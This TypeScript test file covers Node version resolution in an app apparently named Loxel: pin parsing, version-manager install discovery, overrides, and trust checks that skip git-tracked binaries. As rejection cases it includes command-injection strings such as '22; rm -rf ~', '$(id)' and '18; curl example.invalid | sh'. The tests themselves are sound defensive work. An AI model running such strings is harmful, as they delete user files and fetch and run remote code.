import { afterAll, describe, expect, test } from "bun:test";
import { chmodSync, mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";

import type { NodeManager } from "@/api/node-env-model";
import { repeatUntil } from "@/test/repeat-until";

// The tests choose where versions live; the machine's own manager settings must not apply.
for (const name of [
  "NVM_DIR",
  "FNM_DIR",
  "VOLTA_HOME",
  "ASDF_DATA_DIR",
  "MISE_DATA_DIR",
  "MISE_INSTALLS_DIR",
  "XDG_DATA_HOME",
  "N_PREFIX",
  "N_CACHE_PREFIX",
]) {
  delete process.env[name];
}
// Overrides live in the store database; keep the tests' state out of the real one.
const stateDir = mkdtempSync(join(tmpdir(), "node-env-state-"));
process.env.LOXEL_STATE_DIR = stateDir;
const { getNodeEnv, listNodeEnvs, parseNodeSpec, resolveNodeEnv, subscribeNodeEnv } =
  await import("./node-env");
const { setNodeOverride } = await import("./node-override-store");

const root = realpathSync(mkdtempSync(join(tmpdir(), "node-env-")));
let nextId = 0;

afterAll(() => {
  rmSync(root, { recursive: true, force: true });
  rmSync(stateDir, { recursive: true, force: true });
});

function writeNode(filePath: string, output = "unused"): string {
  mkdirSync(dirname(filePath), { recursive: true });
  writeFileSync(filePath, `#!/bin/sh\necho ${output}\n`);
  chmodSync(filePath, 0o755);
  return filePath;
}

/** A worktree and a home, each its own directory, with nothing on PATH. */
function fixture(pins: Record<string, string> = {}) {
  const dir = join(root, String(nextId++));
  const wt = join(dir, "wt");
  const home = join(dir, "home");
  mkdirSync(wt, { recursive: true });
  mkdirSync(home, { recursive: true });
  for (const [file, text] of Object.entries(pins)) writeFileSync(join(wt, file), text);
  return { wt, home, env: { HOME: home, PATH: "", N_PREFIX: join(home, "n-prefix") } };
}

function nvmNode(home: string, version: string, lts?: string): string {
  const install = join(home, ".nvm", "versions", "node", `v${version}`);
  if (lts) {
    mkdirSync(join(install, "include", "node"), { recursive: true });
    writeFileSync(
      join(install, "include", "node", "node_version.h"),
      `#define NODE_VERSION_LTS_CODENAME "${lts}"\n`,
    );
  }
  return writeNode(join(install, "bin", "node"));
}

describe("parseNodeSpec", () => {
  test("understands the forms the tools write", () => {
    expect(parseNodeSpec("22")).toEqual({ kind: "version", parts: ["22"] });
    expect(parseNodeSpec("v22.1.0\n")).toEqual({ kind: "version", parts: ["22", "1", "0"] });
    expect(parseNodeSpec("22.x")).toEqual({ kind: "version", parts: ["22"] });
    expect(parseNodeSpec("node")).toEqual({ kind: "latest" });
    expect(parseNodeSpec("lts/*")).toEqual({ kind: "lts", codename: null });
    expect(parseNodeSpec("lts/iron")).toEqual({ kind: "lts", codename: "iron" });
    expect(parseNodeSpec("lts-Iron")).toEqual({ kind: "lts", codename: "iron" });
  });

  test("refuses anything that could not be shown as a version", () => {
    for (const spec of ["22; rm -rf ~", "path:./x", "$(id)", "lts/-1", "22.0.0-rc.1", ""]) {
      expect(parseNodeSpec(spec)).toBeNull();
    }
  });
});

describe("pins", () => {
  test.each([
    [".nvmrc", "20 # comment\n"],
    [".node-version", "v20\n"],
    [".tool-versions", "python 3.12.0\nnodejs 20 18\n"],
    ["mise.toml", '[tools]\nnode = "20"\n'],
    [".mise.toml", '[tools]\nnode = ["20", "18"]\n'],
    ["package.json", '{"volta":{"node":"20"}}'],
  ])("%s takes the highest installed match", async (file, text) => {
    const { wt, home, env } = fixture({ [file]: text });
    nvmNode(home, "20.9.0");
    const highest = nvmNode(home, "20.18.0");
    nvmNode(home, "22.1.0");
    const { env: node, pin, pinProblem } = await resolveNodeEnv(wt, { overridePath: null, env });
    expect(node).toEqual({ source: "pin", nodePath: highest, version: "20.18.0", manager: "nvm" });
    expect(pin?.file).toBe(file);
    expect(pinProblem).toBeNull();
  });

  test("the first file with a pin wins, and engines selects nothing", async () => {
    const { wt, home, env } = fixture({
      ".nvmrc": "20\n",
      ".node-version": "22\n",
      "package.json": '{"engines":{"node":"22"}}',
    });
    nvmNode(home, "20.1.0");
    nvmNode(home, "22.1.0");
    const { env: node } = await resolveNodeEnv(wt, { overridePath: null, env });
    expect(node?.version).toBe("20.1.0");

    const engines = fixture({ "package.json": '{"engines":{"node":"22"}}' });
    nvmNode(engines.home, "22.1.0");
    const response = await resolveNodeEnv(engines.wt, { overridePath: null, env: engines.env });
    expect(response.pin).toBeNull();
    expect(response.env).toBeNull();
  });

  test("LTS pins read the line from the installation", async () => {
    const { wt, home, env } = fixture({ ".nvmrc": "lts/iron\n" });
    nvmNode(home, "20.18.0", "Iron");
    nvmNode(home, "22.11.0", "Jod");
    nvmNode(home, "23.1.0");
    expect((await resolveNodeEnv(wt, { overridePath: null, env })).env?.version).toBe("20.18.0");

    writeFileSync(join(wt, ".nvmrc"), "lts/*\n");
    expect((await resolveNodeEnv(wt, { overridePath: null, env })).env?.version).toBe("22.11.0");
  });

  test("a pin nothing satisfies falls back to PATH and says what to run", async () => {
    const { wt, home, env } = fixture({ ".nvmrc": "18\n" });
    nvmNode(home, "22.1.0");
    const onPath = writeNode(join(home, "bin", "node"), "v24.0.0");
    const response = await resolveNodeEnv(wt, {
      overridePath: null,
      env: { ...env, PATH: dirname(onPath) },
    });
    expect(response.env).toMatchObject({ source: "system", nodePath: onPath, version: "24.0.0" });
    expect(response.pinProblem).toBe(
      ".nvmrc pins 18, which is not installed. Run `nvm install 18` in a terminal.",
    );
  });

  test("a pin the PATH node satisfies is no problem", async () => {
    const { wt, home, env } = fixture({ ".nvmrc": "24\n" });
    const onPath = writeNode(join(home, "bin", "node"), "v24.0.0");
    const response = await resolveNodeEnv(wt, {
      overridePath: null,
      env: { ...env, PATH: dirname(onPath) },
    });
    expect(response.env?.source).toBe("system");
    expect(response.pinProblem).toBeNull();
  });

  test("with no manager installed, the command is an example", async () => {
    const { wt, env } = fixture({ ".nvmrc": "18\n" });
    const { pinProblem } = await resolveNodeEnv(wt, { overridePath: null, env });
    expect(pinProblem).toContain("for example `nvm install 18`");
  });

  test("a pin that is not a version is reported without repeating it", async () => {
    const { wt, env } = fixture({ ".nvmrc": "18; curl example.invalid | sh\n" });
    const { pin, pinProblem } = await resolveNodeEnv(wt, { overridePath: null, env });
    expect(pin).toBeNull();
    expect(pinProblem).toBe(".nvmrc holds a Node version Loxel cannot read.");
  });

  test("`system` asks for the PATH node", async () => {
    const { wt, home, env } = fixture({ ".tool-versions": "nodejs system\n" });
    nvmNode(home, "22.1.0");
    const response = await resolveNodeEnv(wt, { overridePath: null, env });
    expect(response.pin).toBeNull();
    expect(response.pinProblem).toBeNull();
  });
});

describe("managers", () => {
  const layouts: Array<
    [NodeManager, (home: string) => string, (home: string) => Record<string, string>]
  > = [
    [
      "nvm",
      (h) => join(h, "custom", "versions/node/v20.1.0/bin/node"),
      (h) => ({ NVM_DIR: join(h, "custom") }),
    ],
    [
      "fnm",
      (h) => join(h, ".local/share/fnm/node-versions/v20.1.0/installation/bin/node"),
      () => ({}),
    ],
    ["fnm", (h) => join(h, ".fnm/node-versions/v20.1.0/installation/bin/node"), () => ({})],
    [
      "fnm",
      (h) => join(h, "f/node-versions/v20.1.0/installation/bin/node"),
      (h) => ({ FNM_DIR: join(h, "f") }),
    ],
    ["volta", (h) => join(h, ".volta/tools/image/node/20.1.0/bin/node"), () => ({})],
    ["asdf", (h) => join(h, ".asdf/installs/nodejs/20.1.0/bin/node"), () => ({})],
    ["mise", (h) => join(h, ".local/share/mise/installs/node/20.1.0/bin/node"), () => ({})],
    ["n", (h) => join(h, "n-prefix/n/versions/node/20.1.0/bin/node"), () => ({})],
  ];

  test.each(layouts)("finds %s's installs", async (manager, nodeAt, vars) => {
    const { wt, home, env } = fixture({ ".nvmrc": "20\n" });
    const nodePath = writeNode(nodeAt(home));
    const { env: node } = await resolveNodeEnv(wt, {
      overridePath: null,
      env: { ...env, ...vars(home) },
    });
    expect(node).toEqual({ source: "pin", nodePath, version: "20.1.0", manager });
  });

  test("a PATH node that is a manager's install is not run", async () => {
    const { wt, home, env } = fixture();
    const nodePath = writeNode(
      join(home, ".nvm/versions/node/v22.1.0/bin/node"),
      "v0.0.0-should-not-run",
    );
    const { env: node } = await resolveNodeEnv(wt, {
      overridePath: null,
      env: { ...env, PATH: dirname(nodePath) },
    });
    expect(node).toEqual({ source: "system", nodePath, version: "22.1.0", manager: "nvm" });
  });
});

describe("trust", () => {
  async function gitRepo(wt: string, file: string) {
    const git = (...args: string[]) =>
      Bun.spawnSync(["git", "-C", wt, "-c", "user.email=t@t", "-c", "user.name=t", ...args]);
    git("init", "-q");
    git("add", file);
    git("commit", "-qm", "init");
  }

  test("a tracked node on PATH is skipped for a later one, and never run", async () => {
    const { wt, home, env } = fixture();
    const canary = join(home, "ran");
    const tracked = join(wt, "bin", "node");
    mkdirSync(dirname(tracked));
    writeFileSync(tracked, `#!/bin/sh\ntouch ${canary}\necho v1.0.0\n`);
    chmodSync(tracked, 0o755);
    await gitRepo(wt, "bin/node");
    const later = writeNode(join(home, "bin", "node"), "v24.0.0");
    const { env: node } = await resolveNodeEnv(wt, {
      overridePath: null,
      env: { ...env, PATH: `${dirname(tracked)}:${dirname(later)}` },
    });
    expect(node?.nodePath).toBe(later);
    expect(await Bun.file(canary).exists()).toBe(false);
  });

  test("a tracked override is not used", async () => {
    const { wt, env } = fixture();
    const tracked = writeNode(join(wt, "node"), "v1.0.0");
    await gitRepo(wt, "node");
    const { env: node, overridePath } = await resolveNodeEnv(wt, { overridePath: tracked, env });
    expect(node).toBeNull();
    expect(overridePath).toBe(tracked);
  });

  test("a relative PATH entry is ignored", async () => {
    const { wt, env } = fixture();
    writeNode(join(wt, "node"), "v1.0.0");
    const { env: node } = await resolveNodeEnv(wt, {
      overridePath: null,
      env: { ...env, PATH: "." },
    });
    expect(node).toBeNull();
  });

  test("a version is asked for outside the worktree, where shims have no pin to act on", async () => {
    const { wt, home, env } = fixture();
    const shim = join(home, "shims", "node");
    mkdirSync(dirname(shim));
    writeFileSync(shim, `#!/bin/sh\npwd > "${home}/cwd"\necho v24.0.0\n`);
    chmodSync(shim, 0o755);
    await resolveNodeEnv(wt, { overridePath: null, env: { ...env, PATH: dirname(shim) } });
    expect((await Bun.file(join(home, "cwd")).text()).trim()).toBe(realpathSync(home));
  });
});

describe("override", () => {
  test("wins over a pin, with no pin problem", async () => {
    const { wt, home, env } = fixture({ ".nvmrc": "18\n" });
    const chosen = nvmNode(home, "22.1.0");
    const { env: node, pinProblem } = await resolveNodeEnv(wt, { overridePath: chosen, env });
    expect(node).toEqual({
      source: "override",
      nodePath: chosen,
      version: "22.1.0",
      manager: "nvm",
    });
    expect(pinProblem).toBeNull();
  });

  test("one that is gone falls through to detection and stays reported", async () => {
    const { wt, home, env } = fixture({ ".nvmrc": "22\n" });
    nvmNode(home, "22.1.0");
    const gone = join(home, "gone", "node");
    const response = await resolveNodeEnv(wt, { overridePath: gone, env });
    expect(response.env?.source).toBe("pin");
    expect(response.overridePath).toBe(gone);
  });
});

describe("shared resolution", () => {
  test("listeners hear an edited pin file, and getNodeEnv answers from it", async () => {
    const { wt, home, env } = fixture({ ".nvmrc": "20\n" });
    nvmNode(home, "20.1.0");
    nvmNode(home, "22.1.0");
    const previous = { ...process.env };
    Object.assign(process.env, env);
    try {
      const updates: Array<(version: string | null | undefined) => void> = [];
      const unsubscribe = subscribeNodeEnv(wt, ({ env: node, changed }) => {
        if (changed) updates.shift()?.(node?.version);
      });
      expect((await getNodeEnv(wt)).env?.version).toBe("20.1.0");
      const next = new Promise((resolve) => {
        updates.push(resolve);
      });
      const version = await repeatUntil(next, async () =>
        writeFileSync(join(wt, ".nvmrc"), "22\n"),
      );
      expect(version).toBe("22.1.0");
      expect((await getNodeEnv(wt)).env?.version).toBe("22.1.0");
      unsubscribe();
    } finally {
      process.env.HOME = previous.HOME;
      process.env.PATH = previous.PATH;
      delete process.env.N_PREFIX;
    }
  });

  test("listeners hear a node appearing on PATH", async () => {
    const { wt, home, env } = fixture();
    const bin = join(home, "bin");
    mkdirSync(bin);
    const previous = { ...process.env };
    // Git stays reachable: the trust check asks it about what is found.
    Object.assign(process.env, { ...env, PATH: `${bin}:/usr/bin:/bin` });
    try {
      const updates: Array<(version: string | null | undefined) => void> = [];
      const unsubscribe = subscribeNodeEnv(wt, ({ env: node, changed }) => {
        if (changed) updates.shift()?.(node?.version);
      });
      const first = new Promise((resolve) => {
        updates.push(resolve);
      });
      await getNodeEnv(wt);
      await first;
      const next = new Promise((resolve) => {
        updates.push(resolve);
      });
      const version = await repeatUntil(next, async () => writeNode(join(bin, "node"), "v99.0.0"));
      expect(version).toBe("99.0.0");
      unsubscribe();
    } finally {
      process.env.HOME = previous.HOME;
      process.env.PATH = previous.PATH;
      delete process.env.N_PREFIX;
    }
  });

  test("listNodeEnvs lists installs newest first, then PATH, and the stored override", async () => {
    const { wt, home, env } = fixture();
    const older = nvmNode(home, "9.11.0");
    const newer = nvmNode(home, "20.1.0");
    const onPath = writeNode(join(home, "bin", "node"), "v24.0.0");
    const previous = { ...process.env };
    Object.assign(process.env, { ...env, PATH: `${dirname(onPath)}:${previous.PATH ?? ""}` });
    try {
      setNodeOverride(wt, older);
      const { candidates, automaticPath, overridePath } = await listNodeEnvs(wt);
      expect(candidates.map((c) => c.nodePath)).toEqual([newer, older, onPath]);
      expect(automaticPath).toBe(onPath);
      expect(overridePath).toBe(older);
    } finally {
      process.env.HOME = previous.HOME;
      process.env.PATH = previous.PATH;
      delete process.env.N_PREFIX;
      setNodeOverride(wt, null);
    }
  });
});
